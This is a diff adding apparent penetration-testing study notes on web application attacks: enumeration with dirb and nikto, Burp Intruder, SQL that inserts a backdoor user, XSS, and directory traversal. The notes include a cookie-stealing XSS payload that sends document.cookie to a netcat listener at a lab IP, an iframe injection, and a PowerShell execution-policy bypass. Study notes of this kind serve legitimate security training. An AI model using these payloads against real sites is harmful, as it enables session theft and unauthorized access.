@@ -1,3 +1,87 @@
+#Gather Info:
+1 What does the application do?
+2 What language is it written in? 
+3 What server software is the application running on? etc.
+
+#Web App Enumeration:
+1 Programming language and frameworks
+2 Web server software
+3 Database software
+4 Server operating system
+
+#WebApp Assesment Tools
+
+# DIRB
+
+dirb http://www.site.com -r -z 10     # -r scan non recursively // -z 10 - add 10 milsec delay to each request
+
+# BURP SUITE..,
+
+# NIKTO   #NOT stealth!!!   // for low hanging fruits // up to several hours to finish the scan
+-T  #specify what tests to perform
+nikto -host=http://www.site.com -maxtime=30s    # finish after 30 seconds
+
+# Exploiting Web-Based Vulnerabilities
+
+## Exploiting Admin Consoles    #PRIME Target!
+### Intruder --> OPtions --> Grep - Extract
+PitchFork
+select values to extract from previous response and import them into our next request --> ok // select all values needed
+select "Payloads" for each position
+for our greps --> select number payload, then "Recursive grep", and select from our greps
+and set "initial payload for first request" ex: 0123456789
+if the value contain special characters, we must deselect the checkbox "URL-encode these characters"
+
+### SQLi
+select * from webappdb.users      #show users table from webappdb (usernames and passwords for example)
+insert into webappdb.users(password, username) VALUES ('backdoor','backdoor');    # insert new user and password
+
+# XSS
+- identify entry point / ex: comment section
+- check if special characters are sanitized or not / ex: write as comment - hello ";<>
+# basic XSS
+try - <scriot>alert('XSS')</script>
+#Content Injection
+<iframe src=https://10.11.0.4/report height="0" width="0"></iframe>
+next start listener on our attack machine - sudo nc -lvnp 80 - and visit the comment page - we see in our nc the request from our target
+# Stealing Cookies / PHPSESSIONID / etc
+- set our netcat -> sudo nc -lvnp 80
+- use XSS payload on comment section:
+<script>new Image().src="http://10.11.0.4ourNetCatIP/cool.jpg?output="+document.cookie;</script>
+= on the target we'll use script to simulate admin login. In cmd write:
+powershell -ExecutionPolicy Bypass -File Documents/admin_login.ps1    #script loging in and out, run from cmd and using powershell with executionpolicy bypass to temporarily use unsigned scripts
+
+#Directory Traversal / Path Traversal Vulns
+## Identifying and Exploiting Dir Travesal Vulns    #search for /etc/passwd on linux or boot.ini in win
+# we can target on Win - c:\windows\system32\drivers\etc\hosts file
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
